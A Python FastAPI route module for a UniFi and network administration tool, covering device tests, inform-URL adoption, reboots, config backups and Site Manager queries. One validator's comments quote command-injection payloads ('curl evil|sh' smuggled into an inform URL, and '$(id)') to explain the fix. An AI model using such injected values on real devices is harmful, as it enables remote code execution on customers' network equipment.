"""UniFi and network route handlers."""

from __future__ import annotations

import logging
import re

from fastapi import APIRouter, Depends, Request
from fastapi.responses import JSONResponse

from app.core.exceptions import (
    AuthError,
    ConflictError,
    ForbiddenError,
    IntegrationError,
    NotFoundError,
    ValidationError,
)
from app.core.validation import validate_host
from app.models.user import Role, User
from app.web.middleware.auth import (
    get_current_user,
    require_customer_access,
    require_role,
)

router = APIRouter()
logger = logging.getLogger(__name__)


@router.post("/unifi/test")
async def unifi_test(request: Request, user: User = Depends(get_current_user)):
    """Test UniFi Controller connectivity."""
    from app.modules.unifi_audit.client import UniFiControllerClient

    body = await request.json()
    host = body.get("host", "").strip()
    username = body.get("username", "").strip()
    password = body.get("password", "").strip()
    is_unifi_os = body.get("is_unifi_os", False)

    if not host or not username or not password:
        raise ValidationError("Host, brukernavn og passord er påkrevd")

    # Ensure host has protocol prefix
    if not host.startswith("http://") and not host.startswith("https://"):
        host = "https://" + host

    try:
        async with UniFiControllerClient(host, username, password, is_unifi_os=is_unifi_os) as uf:
            result = await uf.test_connection()
            return result
    except Exception as e:
        raise ValidationError(str(e))


@router.post("/unifi/test-device")
async def unifi_test_device(request: Request, user: User = Depends(require_role(Role.technician))):
    """Test direct connectivity to a standalone UniFi device."""
    from app.modules.unifi_audit.client import UniFiDirectDevice

    body = await request.json()
    host = body.get("host", "").strip()
    username = body.get("username", "ubnt").strip()
    password = body.get("password", "ubnt").strip()
    device_type = body.get("device_type", "ap")

    if not host:
        raise ValidationError("Host/IP er påkrevd")

    async with UniFiDirectDevice(host, username, password, device_type=device_type) as dev:
        result = await dev.test_connection()
        return result


def _validated_inform_url(raw: str) -> str:
    """Normalise and validate a controller inform URL.

    The old check was ``startswith("http")`` and ``endswith("/inform")``, which
    a payload like ``http://x/;curl evil|sh #/inform`` satisfies — and the
    result was interpolated into a root shell command on the device. Parse it
    properly instead: scheme, host through the same validator the rest of the
    app uses, and a path that *ends* with /inform (UniFi's own proxy form is
    /proxy/network/inform, so an equality check would reject a legitimate URL).
    """
    from urllib.parse import urlparse

    from app.core.validation import validate_host

    url = raw.strip()
    if not url:
        raise ValidationError("Controller URL er påkrevd")
    if "://" not in url:
        url = "http://" + url
    if not url.rstrip("/").endswith("/inform"):
        url = url.rstrip("/") + "/inform"

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValidationError("Controller URL må bruke http eller https")
    try:
        hostname, port = parsed.hostname, parsed.port
    except ValueError as e:
        # urlparse defers parsing the port until the attribute is read, and
        # then raises plain ValueError — "x:99999" and "x:abc" both reached the
        # global handler as a 500 "internal error" instead of telling the
        # technician their URL was malformed.
        raise ValidationError(f"Ugyldig port i controller URL: {e}") from e
    if not hostname:
        raise ValidationError("Controller URL mangler vertsnavn")
    validate_host(hostname, "controller_url")
    if parsed.query or parsed.fragment or parsed.params:
        raise ValidationError("Controller URL kan ikke inneholde query eller fragment")
    # Restrict the path to unreserved URL characters. Without this, a path like
    # /$(id)/inform parses cleanly and ends with /inform — shlex.quote at the
    # command boundary neutralises it, but there is no reason for the route to
    # accept a string that is obviously not an inform endpoint.
    if not re.fullmatch(r"[A-Za-z0-9._~/-]*/inform", parsed.path):
        raise ValidationError("Controller URL må peke på /inform")
    # urlparse strips the brackets off an IPv6 literal, so rebuilding from
    # .hostname alone turns http://[::1]:8443/inform into http://::1:8443/inform
    # — which the device cannot resolve and which no longer round-trips.
    netloc_host = f"[{hostname}]" if ":" in hostname else hostname
    port_part = f":{port}" if port else ""
    # Rebuild from the parsed parts so nothing outside them survives.
    return f"{parsed.scheme}://{netloc_host}{port_part}{parsed.path}"


@router.post("/unifi/set-inform")
async def unifi_set_inform(request: Request, user: User = Depends(require_role(Role.technician))):
    """Set inform URL on a direct UniFi device to adopt it to a controller."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    body = await request.json()
    host = body.get("host", "").strip()
    username = body.get("username", "ubnt").strip()
    password = body.get("password", "ubnt").strip()

    if not host:
        raise ValidationError("Host/IP er påkrevd")
    validate_host(host, "host")
    controller_url = _validated_inform_url(body.get("controller_url", ""))

    log_activity(
        "unifi_set_inform",
        detail=f"Satte inform-URL på {host} til {controller_url}",
        user=user.username,
    )
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.set_inform(controller_url)


@router.post("/unifi/reboot-device")
async def unifi_reboot_device(request: Request, user: User = Depends(require_role(Role.technician))):
    """Reboot a direct UniFi device."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    body = await request.json()
    host = body.get("host", "").strip()
    username = body.get("username", "ubnt").strip()
    password = body.get("password", "ubnt").strip()

    if not host:
        raise ValidationError("Host/IP er påkrevd")
    validate_host(host, "host")

    # Taking a customer's access point down is disruptive and, until now,
    # anonymous — this router recorded nothing at all.
    log_activity("unifi_reboot_device", detail=f"Startet {host} på nytt", user=user.username)
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.reboot()


@router.post("/unifi/device-config")
async def unifi_device_config(request: Request, user: User = Depends(require_role(Role.technician))):
    """Dump running config from a direct UniFi device."""
    from app.core.activity_log import log_activity
    from app.modules.unifi_audit.client import UniFiDirectDevice

    body = await request.json()
    host = body.get("host", "").strip()
    username = body.get("username", "ubnt").strip()
    password = body.get("password", "ubnt").strip()

    if not host:
        raise ValidationError("Host/IP er påkrevd")
    validate_host(host, "host")

    log_activity("unifi_device_config", detail=f"Hentet konfigurasjon fra {host}", user=user.username)
    async with UniFiDirectDevice(host, username, password) as dev:
        return await dev.get_config_dump()


@router.post("/network/scan")
async def network_scan_subnet(request: Request, user: User = Depends(require_role(Role.technician))):
    """Scan a subnet for UniFi devices."""
    from app.modules.unifi_audit.scanner import scan_subnet

    body = await request.json()
    subnet = body.get("subnet", "").strip()
    if not subnet:
        raise ValidationError("Subnet er påkrevd (f.eks. 192.168.1.0/24)")

    results = await scan_subnet(subnet, max_concurrent=body.get("max_concurrent", 50))
    if results and "error" in results[0]:
        raise ValidationError(results[0]["error"])

    return {"subnet": subnet, "found": results, "count": len(results)}


@router.post("/network/save-config-backup")
async def network_save_config_backup(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Save a device config dump to the customer's audit directory."""
    from app.core.config import get_audit_dir
    from app.core.customer import CustomerManager
    from app.core.encryption import encrypted_write_text

    body = await request.json()
    host = body.get("host", "").strip()
    config_text = body.get("config", "")
    if not host or not config_text:
        raise ValidationError("Host og konfigurasjon er påkrevd")

    active = CustomerManager.get_active()
    if not active:
        raise ValidationError("Ingen aktiv kunde")

    # Save to customer audit dir under network_configs/
    from datetime import datetime
    safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
    audit_dir = get_audit_dir() / safe_name / "network_configs"
    audit_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H%M")
    safe_host = host.replace(".", "_").replace(":", "_")
    filename = f"{timestamp}_{safe_host}.cfg"
    filepath = audit_dir / filename

    encrypted_write_text(filepath, config_text)

    return {"ok": True, "path": str(filepath), "filename": filename}


@router.get("/network/config-backups")
async def network_list_config_backups(user: User = Depends(get_current_user)):
    """List saved network config backups for the active customer."""
    from app.core.config import get_audit_dir
    from app.core.customer import CustomerManager

    active = CustomerManager.get_active()
    if not active:
        return {"backups": []}

    safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
    backup_dir = get_audit_dir() / safe_name / "network_configs"
    if not backup_dir.exists():
        return {"backups": []}

    backups = []
    for f in sorted(backup_dir.glob("*.cfg"), reverse=True):
        parts = f.stem.split("_", 2)
        backups.append({
            "filename": f.name,
            "path": str(f),
            "timestamp": parts[0] + " " + parts[1] if len(parts) >= 2 else f.stem,
            "host": parts[2].replace("_", ".") if len(parts) >= 3 else "",
            "size": f.stat().st_size,
        })

    return {"backups": backups}


@router.post("/unifi/save")
async def unifi_save(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Save UniFi config for the active customer."""
    from app.core.activity_log import log_activity
    from app.core.credentials import store_secret
    from app.core.customer import CustomerManager
    from app.core.rbac import check_customer_access

    body = await request.json()
    active = CustomerManager.get_active()
    if not active:
        raise ValidationError("Ingen aktiv kunde")

    cust_id = active["_id"]
    # The active customer is process-global: whoever switched last decides what
    # it means for everyone. Writing to it needs the same check as naming it.
    if not await check_customer_access(user, cust_id):
        raise ForbiddenError("Du har ikke tilgang til denne kunden")
    config = CustomerManager.get_customer(cust_id)
    if not config:
        raise NotFoundError("Kunde ikke funnet")

    # Absent means "leave alone". Writing each field unconditionally from the
    # body meant a partial save reset everything it did not mention — the same
    # defect as /fortigate/save, where an omitted host blanked the address
    # while the stored controller credentials stayed behind.
    old_host = (config.get("UniFiHost") or "").strip()
    if body.get("mode") is not None:
        config["UniFiMode"] = str(body["mode"]) or "controller"  # "controller" or "direct"
    if body.get("host") is not None:
        host = str(body["host"]).strip()
        if host:
            validate_host(host, "host")
        config["UniFiHost"] = host
    if body.get("is_unifi_os") is not None:
        config["UniFiIsUniFiOS"] = bool(body["is_unifi_os"])
    if body.get("site") is not None:
        config["UniFiSite"] = str(body["site"]).strip() or "default"

    # Save direct devices list (always update when mode is direct)
    devices = body.get("devices", [])
    if body.get("mode") == "direct" or devices:
        config["UniFiDirectDevices"] = devices

    username = body.get("username", "").strip()
    password = body.get("password", "").strip()
    if username:
        store_secret(cust_id, "unifi_username", username)
    if password:
        store_secret(cust_id, "unifi_password", password)

    save_data = {k: v for k, v in config.items() if not k.startswith("_")}
    CustomerManager.save_customer(save_data)

    new_host = (config.get("UniFiHost") or "").strip()
    detail = f"Lagret UniFi-oppsett for {active.get('CustomerName', cust_id)}"
    if new_host != old_host:
        detail += f" — adresse endret fra {old_host or '(ingen)'} til {new_host or '(ingen)'}"
    if password:
        detail += " — nytt passord lagret"
    log_activity("unifi_save", detail=detail, customer=cust_id, user=user.username)

    return {"ok": True}


@router.post("/network/quick-audit")
async def network_quick_audit(user: User = Depends(require_role(Role.technician))):
    """Run a quick network audit — gathers key data from FortiGate and/or UniFi."""
    import json as _json

    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager
    from app.services.network_audit import run_quick_network_audit

    active = CustomerManager.get_active()
    if not active:
        raise ValidationError("Ingen aktiv kunde")

    cust_id = active.get("_id", "")
    results = await run_quick_network_audit(active, cust_id)

    if not results["fortigate"] and not results["unifi"]:
        raise ValidationError("Ingen nettverksenheter konfigurert for denne kunden")

    # Clean results for JSON serialization
    try:
        clean = _json.loads(_json.dumps(results, default=str))
    except (TypeError, ValueError):
        clean = results

    # Persist results to audit directory
    try:
        from datetime import datetime as _dt

        from app.core.config import get_audit_dir
        from app.core.encryption import encrypted_write_text

        safe_name = active.get("CustomerName", "unknown").replace(" ", "_")
        audit_base = get_audit_dir() / safe_name
        runs = sorted(audit_base.glob("20*_*"), reverse=True) if audit_base.exists() else []
        if runs:
            net_dir = runs[0]
        else:
            ts = _dt.now().strftime("%Y-%m-%d_%H%M")
            net_dir = audit_base / ts
            net_dir.mkdir(parents=True, exist_ok=True)

        if clean.get("fortigate") and "error" not in clean["fortigate"]:
            encrypted_write_text(net_dir / "60_fortigate_audit.txt",
                                 _json.dumps(clean["fortigate"], indent=2, default=str))
        if clean.get("unifi") and "error" not in clean["unifi"]:
            encrypted_write_text(net_dir / "61_unifi_audit.txt",
                                 _json.dumps(clean["unifi"], indent=2, default=str))
        logger.info("Network audit results saved to %s", net_dir)
    except Exception as e:
        logger.warning("Failed to save network audit results: %s", e)

    return JSONResponse(content=clean)


@router.get("/network-devices")
async def get_network_devices(user: User = Depends(get_current_user)):
    """Return configured network devices for the active customer."""
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager

    active = CustomerManager.get_active()
    if not active:
        return {"fortigate": None, "unifi": None}

    cust_id = active.get("_id", "")
    fg = None
    if active.get("FortiGateHost"):
        fg = {
            "host": active["FortiGateHost"],
            "port": active.get("FortiGatePort", 443),
            "vdom": active.get("FortiGateVDOM", "root"),
            "verify_ssl": active.get("FortiGateVerifySSL", True),
            "has_token": bool(get_secret(cust_id, "fortigate_api_token")),
        }

    uf = None
    unifi_mode = active.get("UniFiMode", "controller")
    if active.get("UniFiHost") or active.get("UniFiDirectDevices"):
        uf = {
            "mode": unifi_mode,
            "host": active.get("UniFiHost", ""),
            "is_unifi_os": active.get("UniFiIsUniFiOS", False),
            "site": active.get("UniFiSite", "default"),
            "has_credentials": bool(get_secret(cust_id, "unifi_username")),
            "direct_devices": active.get("UniFiDirectDevices", []),
        }

    return {"fortigate": fg, "unifi": uf}


# ═══════════════════════════════════════════════════════════════════════════════
# Enhanced UniFi API endpoints (require technician role)
# ═══════════════════════════════════════════════════════════════════════════════


@router.get("/unifi/clients/{customer_id}")
async def unifi_clients(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Get all connected clients for a customer's UniFi site."""
    from app.services.unifi_api import get_client_inventory

    try:
        clients = await get_client_inventory(customer_id)
        wireless = sum(1 for c in clients if c["type"] == "wireless")
        wired = len(clients) - wireless
        return {"ok": True, "clients": clients, "count": len(clients),
                "wireless": wireless, "wired": wired}
    except ValueError as e:
        raise ValidationError(str(e))
    except Exception as e:
        logger.exception("unifi_clients failed for %s", customer_id)
        raise IntegrationError(str(e))


@router.get("/unifi/wifi-health/{customer_id}")
async def unifi_wifi_health(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Get WiFi health overview for a customer's UniFi site."""
    from app.services.unifi_api import get_wifi_health

    try:
        data = await get_wifi_health(customer_id)
        return {"ok": True, **data}
    except ValueError as e:
        raise ValidationError(str(e))
    except Exception as e:
        logger.exception("unifi_wifi_health failed for %s", customer_id)
        raise IntegrationError(str(e))


@router.get("/unifi/dashboard/{customer_id}")
async def unifi_dashboard(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Enhanced device stats for all devices on the customer's controller."""
    from app.services.unifi_api import get_enhanced_device_stats

    try:
        devices = await get_enhanced_device_stats(customer_id)
        return {"ok": True, "devices": devices, "count": len(devices)}
    except ValueError as e:
        raise ValidationError(str(e))
    except Exception as e:
        logger.exception("unifi_dashboard failed for %s", customer_id)
        raise IntegrationError(str(e))


@router.post("/unifi/site-manager/auth")
async def unifi_site_manager_auth(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Authenticate with UniFi Site Manager via API key or SSO credentials."""
    from app.services.unifi_api import site_manager_authenticate

    body = await request.json()
    api_key = body.get("api_key", "").strip()
    username = body.get("username", "").strip()
    password = body.get("password", "").strip()
    customer_id = body.get("customer_id")

    if not api_key and (not username or not password):
        raise ValidationError("API-nøkkel eller brukernavn/passord er påkrevd")

    result = await site_manager_authenticate(
        username=username or None,
        password=password or None,
        api_key=api_key or None,
        store_for_customer=customer_id,
    )
    if result.get("ok"):
        return {"ok": True, "method": result.get("method", "unknown")}
    # 2FA required — pass session token back to client for the second step
    if result.get("requires_2fa"):
        return JSONResponse({
            "ok": False,
            "requires_2fa": True,
            "session_token": result.get("session_token", ""),
            "error": result.get("error", "2FA-kode påkrevd"),
            # Echo back customer_id so the frontend can pass it to verify
            "customer_id": customer_id or "",
        }, status_code=200)
    # Use 400 (not 401!) — 401 would trigger JWT refresh/logout in the frontend
    raise ValidationError(result.get("error", "Ukjent feil"))


@router.post("/unifi/site-manager/verify-2fa")
async def unifi_site_manager_verify_2fa(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Complete UniFi Site Manager SSO 2FA verification."""
    from app.services.unifi_api import site_manager_verify_2fa

    body = await request.json()
    session_token = body.get("session_token", "").strip()
    code = body.get("code", "").strip()
    customer_id = body.get("customer_id")

    if not session_token or not code:
        raise ValidationError("Session-token og 2FA-kode er påkrevd")

    result = await site_manager_verify_2fa(
        session_token=session_token,
        totp_code=code,
        store_for_customer=customer_id,
    )
    if result.get("ok"):
        return {"ok": True, "method": result.get("method", "sso")}
    raise ValidationError(result.get("error", "Ukjent feil"))


@router.get("/unifi/site-manager/sites")
async def unifi_site_manager_sites(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """List cloud-managed sites from ui.com Site Manager."""
    from app.services.unifi_api import site_manager_list_sites

    customer_id = request.query_params.get("customer_id")
    result = await site_manager_list_sites(customer_id=customer_id)

    if not result.get("ok"):
        error_msg = result.get("error", "Unknown error")
        if "expired" in error_msg.lower():
            raise AuthError(error_msg)
        raise ValidationError(error_msg)
    return result


@router.get("/unifi/firmware-check/{customer_id}")
async def unifi_firmware_check(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Check all devices against the firmware database for outdated/EOL firmware."""
    from app.services.unifi_api import firmware_check_all

    try:
        result = await firmware_check_all(customer_id)
        return {"ok": True, **result}
    except ValueError as e:
        raise ValidationError(str(e))
    except Exception as e:
        logger.exception("firmware_check failed for %s", customer_id)
        raise IntegrationError(str(e))


@router.get("/unifi/controller-summary/{customer_id}")
async def unifi_controller_summary(
    customer_id: str,
    user: User = Depends(require_customer_access(Role.technician)),
):
    """Aggregate controller view: sites, devices, clients, WLANs, alarms."""
    from app.services.unifi_api import get_controller_summary

    try:
        summary = await get_controller_summary(customer_id)
        return {"ok": True, **summary}
    except ValueError as e:
        raise ValidationError(str(e))
    except Exception as e:
        logger.exception("controller_summary failed for %s", customer_id)
        raise IntegrationError(str(e))


# ── Site Manager: all devices ────────────────────────────────────────────────

@router.get("/unifi/sm/devices")
async def unifi_sm_devices(
    host_id: str = "",
    user: User = Depends(get_current_user),
):
    """Get all devices across all sites from Site Manager API."""
    from app.services.unifi_api import get_all_devices
    result = await get_all_devices(host_id or None)
    if not result.get("ok"):
        raise ValidationError(result.get("error", "Failed to fetch devices"))
    return result


# ── Site Manager: ISP metrics ────────────────────────────────────────────────

@router.get("/unifi/sm/isp-metrics")
async def unifi_sm_isp_metrics(
    metric_type: str = "1h",
    duration: str = "24h",
    user: User = Depends(get_current_user),
):
    """Get ISP performance metrics (bandwidth, latency, packet loss)."""
    from app.services.unifi_api import get_isp_metrics
    result = await get_isp_metrics(metric_type, duration)
    if not result.get("ok"):
        raise ValidationError(result.get("error", "Failed to fetch ISP metrics"))
    return result


# ── Matching cloud sites to customers ────────────────────────────────────────

@router.get("/unifi/site-matches")
async def unifi_site_matches(
    include_linked: bool = False,
    user: User = Depends(get_current_user),
):
    """Propose a customer for each console. Writes nothing.

    Matched on the console name, not the site name: a site is called "default"
    on 29 of 30 consoles in a live account and an opaque id on the rest, so
    matching on it proposed nothing for 76 of 77. The console carries the name
    a technician typed at adoption.

    Customers already carrying a console are left out, so a re-run proposes
    only what is still unlinked. Pass ``include_linked=true`` to reconsider
    everything — a deliberate act, since applying a second console to a
    customer overwrites the first.
    """
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers, get_accessible_customer_ids
    from app.services.unifi_api import (
        get_hosts_with_names,
        match_hosts_to_customers,
        summarise_host_matches,
    )

    listing = await get_hosts_with_names()
    if not listing.get("ok"):
        raise ValidationError(listing.get("error", "Failed to fetch hosts"))

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)
    return summarise_host_matches(
        match_hosts_to_customers(
            listing.get("hosts", []), customers, include_linked=include_linked
        )
    )


@router.post("/unifi/site-matches/apply")
async def unifi_site_matches_apply(
    request: Request,
    user: User = Depends(require_role(Role.technician)),
):
    """Record the chosen site → customer links on the customer records.

    Applies exactly the pairs given, never the matcher's own guesses: a
    proposal is a suggestion until a person accepts it, and an ambiguous name
    resolved by score alone is a coin flip written into a customer record.

    This records ownership. It does not grant controller access — that still
    needs a host and a login stored against the customer.
    """
    from app.core.customer import CustomerManager
    from app.core.rbac import check_customer_access

    body = await request.json()
    pairs = body.get("matches") or []
    if not pairs:
        raise ValidationError("Ingen koblinger oppgitt")

    applied, skipped = [], []
    for pair in pairs:
        cust_id = str(pair.get("customer_id") or "").strip()
        host_id = str(pair.get("host_id") or "").strip()
        if not cust_id or not host_id:
            skipped.append({"customer_id": cust_id, "reason": "mangler id"})
            continue
        # check_customer_access returns a bool rather than raising, so the
        # result has to be acted on. A request naming a customer the caller
        # may not touch fails whole rather than skipping quietly — a silent
        # skip would read as "applied" to anyone glancing at the response.
        if not await check_customer_access(user, cust_id):
            raise ForbiddenError(f"Ingen tilgang til kunde {cust_id}")

        config = CustomerManager.get_customer(cust_id)
        if not config:
            skipped.append({"customer_id": cust_id, "reason": "ukjent kunde"})
            continue
        config["UniFiHostId"] = host_id
        CustomerManager.save_customer(
            {k: v for k, v in config.items() if not k.startswith("_")}
        )
        applied.append({"customer_id": cust_id, "host_id": host_id})

    return {"ok": True, "applied": applied, "skipped": skipped}


# ── Controller coverage across the portfolio ─────────────────────────────────

@router.get("/unifi/controller-coverage")
async def unifi_controller_coverage(user: User = Depends(get_current_user)):
    """Which customers have a reachable controller, and what each one is missing.

    The cloud key stops at counts — per-site clients, firewall zones and ACLs
    all need a controller login stored against the customer. That storage has
    always existed; what did not was a way to see where it is absent, since
    has_credentials was only ever reported for the active customer.

    Filtered to the customers this user may see, so the answer is scoped to
    their own portfolio rather than the whole tenant.
    """
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers, get_accessible_customer_ids
    from app.services.unifi_api import (
        classify_controller_access,
        summarise_controller_coverage,
    )

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)

    rows = []
    for cust in customers:
        cid = cust.get("_id", "")
        state, reason = classify_controller_access(
            cust, bool(get_secret(cid, "unifi_username"))
        )
        rows.append({
            "customer_id": cid,
            "name": cust.get("CustomerName", cid),
            "state": state,
            "reason": reason,
            "host": (cust.get("UniFiHost") or "").strip(),
            "site": cust.get("UniFiSite", "default"),
        })

    rows.sort(key=lambda r: (
        # Fixable gaps first: a stored address with no login is one form away
        # from working, and is the only state a credential would change.
        0 if r["state"] == "host_only" else 1,
        r["name"].lower(),
    ))
    return summarise_controller_coverage(rows)


# ── Site Manager: site overview ──────────────────────────────────────────────

@router.get("/unifi/sm/sites-overview")
async def unifi_sm_sites_overview(
    user: User = Depends(get_current_user),
):
    """Per-site device and client counts, WAN health and gateway IPS posture.

    One upstream call. /v1/sites already carries all of this; the panel was
    assembling a thinner version of it from other endpoints.
    """
    from app.services.unifi_api import get_site_overview
    result = await get_site_overview()
    if not result.get("ok"):
        raise ValidationError(result.get("error", "Failed to fetch site overview"))
    return result


# ── Site Manager: API diagnostics ────────────────────────────────────────────

@router.get("/unifi/sm/diagnostics")
async def unifi_sm_diagnostics(
    _admin: User = Depends(require_role(Role.admin)),
):
    """Report which Site Manager endpoints answer, and the shape they return.

    Admin-only. The response carries key paths, value types and counts — never
    field values, and never the API key. It exists because the vendor
    documentation is client-rendered and unreadable by a fetch, so the only
    reliable source for the response shape is the live API. Parsing this API
    against an assumed shape is what produced a panel of zeros.
    """
    from app.services.unifi_api import probe_site_manager_api
    result = await probe_site_manager_api()
    if not result.get("ok"):
        raise ValidationError(result.get("error", "Diagnostics unavailable"))
    return result


# ── Site Manager: WAN details per site ───────────────────────────────────────

@router.get("/unifi/sm/site/{site_id}/wan")
async def unifi_sm_site_wan(
    site_id: str,
    user: User = Depends(get_current_user),
):
    """Get WAN/ISP details and gateway info for a specific site."""
    from app.services.unifi_api import get_site_wan_details
    result = await get_site_wan_details(site_id)
    if not result.get("ok"):
        raise ValidationError(result.get("error", "Failed to fetch WAN details"))
    return result


# ── Unified UniFi view (all customers) ──────────────────────────────────────


@router.get("/unifi/all")
async def unifi_all(request: Request, user: User = Depends(get_current_user)):
    """Get UniFi device status for ALL customers that have UniFi configured."""
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers, get_accessible_customer_ids

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)

    unifi_customers = []
    for c in customers:
        if c.get("UniFiHost"):
            unifi_customers.append({
                "customer_id": c.get("_id", ""),
                "customer_name": c.get("CustomerName", ""),
                "host": c.get("UniFiHost", ""),
                "mode": c.get("UniFiMode", "controller"),
            })

    # Get cached device data from dashboard poller
    try:
        from app.services.dashboard_poller import poller as _poller
    except ImportError:
        _poller = None
    all_devices = []
    if _poller:
        for dev in _poller.get_devices():
            if dev.get("vendor") == "unifi":
                # Find customer name
                cust_name = ""
                for uc in unifi_customers:
                    if uc["customer_id"] == dev.get("customer_id"):
                        cust_name = uc["customer_name"]
                        break
                dev["customer_name"] = cust_name
                all_devices.append(dev)

    # If no per-customer UniFi config but global Site Manager API key is set,
    # fetch sites from cloud API so the UniFi tab isn't empty.
    # v1 API allows 10,000 req/min — no caching needed.
    sm_sites = []
    if not unifi_customers and not all_devices:
        from app.core.config import load_app_settings
        api_key = load_app_settings().get("unifi_site_manager_api_key", "")
        if api_key:
            try:
                from app.services.unifi_api import site_manager_list_sites
                sm_result = await site_manager_list_sites(token=api_key)
                if sm_result.get("ok"):
                    sm_sites = sm_result.get("sites", [])
            except Exception as e:
                logger.warning("Site Manager fetch for /unifi/all failed: %s", e)

            for host in sm_sites:
                # Host/console entry — full detail for the detail panel
                entry = {k: v for k, v in host.items()}
                entry["ip"] = entry.pop("wan_ip", "")
                entry["clients"] = entry.pop("client_count", 0)
                entry["vendor"] = "unifi"
                entry["customer_name"] = ""
                entry["source"] = "site_manager"
                entry["entry_type"] = "host"
                all_devices.append(entry)

    online = sum(1 for d in all_devices if d.get("status") == "online")
    total_clients = sum(d.get("clients", 0) or 0 for d in all_devices)
    total_sub_devices = sum(d.get("device_count", 0) or 0 for d in all_devices)

    return {
        "devices": all_devices,
        "customers": unifi_customers,
        "summary": {
            "total_devices": total_sub_devices or len(all_devices),
            "online": online,
            "offline": len(all_devices) - online,
            "total_clients": total_clients,
            "configured_customers": len(unifi_customers) or len(sm_sites),
        },
    }
